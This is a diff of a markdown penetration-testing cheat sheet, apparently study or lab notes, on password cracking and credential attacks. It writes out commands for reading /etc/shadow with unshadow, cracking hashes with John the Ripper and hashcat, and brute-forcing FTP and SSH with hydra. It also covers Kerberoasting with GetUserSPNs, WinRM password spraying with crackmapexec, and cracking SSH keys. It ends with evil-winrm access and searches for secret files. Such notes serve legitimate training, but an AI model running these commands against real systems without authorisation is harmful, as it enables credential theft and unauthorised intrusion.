@@ -52,9 +52,10 @@ sudo unshadow /etc/passwd /etc/shadow > combined.txt
 ```bash
 sudo adduser vulnuser (room number: 8848.86 password vulnuser8848.86)
 # [Your First Name] user a password of [Your Second Name] (you will not
-# see anything on the screen when you type the password). Press ENTER for all the subsequent
-# prompts (Full Name, Room Number, Work Phone, Home Phone, and Other) until the last prompt,
-# which asks “Is the information correct? [Y/n].
+# see anything on the screen when you type the password).
+# Press ENTER for all the subsequent prompts
+# (Full Name, Room Number, Work Phone, Home Phone, and Other) until the
+# last prompt, which asks “Is the information correct? [Y/n].
 ```
 
 #### John The Ripper
@@ -62,14 +63,19 @@ sudo adduser vulnuser (room number: 8848.86 password vulnuser8848.86)
 > John the Ripper will not attempt to crack a password it has already cracked.
 
 ```bash
-sudo john --wordlist=/usr/share/john/password.lst --format=crypt combined.txt
 # By the time you are reading this, support for the $y$ hashes might
-# be incorporated into John the Ripper, which would mean you could leave off --format=crypt
-# for some speedup
-sudo john --show --format=crypt combined.txt # See all passwords already cracked.
-sudo rm /root/.john/john.pot # To remove remembered password.
+# be incorporated into John the Ripper, which would mean you could
+# leave off --format=crypt for some speedup
+sudo john --wordlist=/usr/share/john/password.lst --format=crypt combined.txt
 
-sudo john --format=crypt combined.txt # By default single crack mode, uses the GECOS field, without wordlist.
+# See all passwords already cracked.
+sudo john --show --format=crypt combined.txt
+
+# To remove remembered password.
+sudo rm /root/.john/john.pot
+
+# By default single crack mode, uses the GECOS field, without wordlist.
+sudo john --format=crypt combined.txt
 
 sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt combined.txt
 ```
@@ -78,30 +84,18 @@ sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt combined.tx
 sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 faiz.txt
 ```
 
-#### hashcat
-
-```bash
-hashcat -m 13100 hash passlist.txt # -m refers to hash type
-```
-
 #### hydra
 
 ```bash
-hydra -L username.txt -P /usr/share/wordlists/rockyou.txt ftp <target-ip-addr> -vV # Target FTP
+# Target FTP
+hydra -L username.txt -P /usr/share/wordlists/rockyou.txt ftp <target-ip-addr> -vV
   -L username file
   -l username
   -P password file
   -p password
 
+# Target SSH
 hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target-ip-addr> -vV
-```
-
-#### GetUserSPNs.py
-
-> Note: If there is misconfigured account, we can obtain the credentials from Active Directory using `GetUserSPNs`.
-
-```bash
-GetUserSPNs.py -dc-ip <target-windows-ip-addr> <host>/<user>:<pass> -request
 ```
 
 ### Windows Password
@@ -137,21 +131,85 @@ Beatles:5be2f274f2f80c5d4d0c597f023f4f61::::
 StarWars:b7c899154197e8a2a33121d76a240ab5::::
 ```
 
+#### GetUserSPNs.py
+
+> Note: If there is misconfigured account, we can obtain the credentials from Active Directory using `GetUserSPNs`.
+
+```bash
+impacket-GetUserSPNs -dc-ip <dc-ip-addr> <host>.local/<user>:<pass> -request
+```
+
+> If error: `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` you need to synchronize the host with the Domain Controller time.
+
+```bash
+# Download from here https://sourceforge.net/projects/openrdate/
+tar -xvzf opendate-1.2.tar.gz
+
+cd opendate
+./configure
+make
+make install
+rdate -n <domain-controller-ip>
+```
+
 #### John The Ripper
 
 ```bash
-sudo crunch 4 4 | sudo john --format=NT windowshashes.txt --stdin # Brute force of 4 character.
+# Brute force of 4 character.
+sudo crunch 4 4 | sudo john --format=NT windowshashes.txt --stdin
 
 sudo john --format=NT windowhashes.txt
 
 sudo john --show --format=NT windowshashes.txt
+
+john --format=krb5tgs --wordlist=password.txt hash.kerberoast
+```
+
+#### crackmapexec
+
+```bash
+# Generating passwords. e.g. (ADMINISTRATOR1996)
+crunch 18 18 -t ^ADMINISTRATOR19%% > passwords.txt
+
+crackmapexec winrm <target-ip-addr> -u Administrator -p passlist
+```
+
+#### hashcat
+
+```bash
+hashcat -m 13100 --force -a 0 hash.kerberoast password.txt # -m refers to hash type
 ```
 
 ### SSH Pass key
 
 ```bash
-./opt/john/ssh2john.py id_rsa > ssh_hash.txt
+
+python /usr/share/john/ssh2john.py id_rsa > ssh_hash.txt
+
 john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
+or
+john ssh_hash.txt
+
+# Avoid Unprotected Warning
+chmod 600 id_rsa
+
+ssh -i id_rsa user@<target-ip-addr>
+```
+
+## Window Remote Management (WinRM)
+
+```bash
+gem install evil-winrm
+
+evil-winrm -i <target-windows-ip-addr> -u 'admin' -p 'pass'
+
+# PowerShell
+Get-ChildItem -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
+# Windows Prompt
+dir secret.doc /s /p
+
+# Display content of file
+type <path>
 ```
 
 ## Remediation
